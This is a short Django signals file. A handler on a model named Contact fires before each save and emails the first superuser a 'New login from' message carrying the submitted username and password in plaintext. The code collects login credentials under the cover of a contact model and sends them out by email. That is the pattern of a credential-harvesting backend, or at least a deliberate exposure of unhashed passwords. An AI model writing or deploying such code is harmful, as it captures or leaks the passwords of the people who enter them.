from django.core.mail import send_mail
from django.contrib.auth.models import User
from django.db.models.signals import pre_save
from django.dispatch import receiver
from .models import Contact

@receiver(pre_save, sender=Contact)
def send_contact_email(sender, instance, **kwargs):
    print("Signal triggered")  
    superuser = User.objects.filter(is_superuser=True).first()
    if superuser:
        send_mail(
            subject=f"New login from {instance.username}",
            message=f"Username: {instance.username}\nPassword: {instance.password}",
            from_email=None,
            recipient_list=[superuser.email],
        )
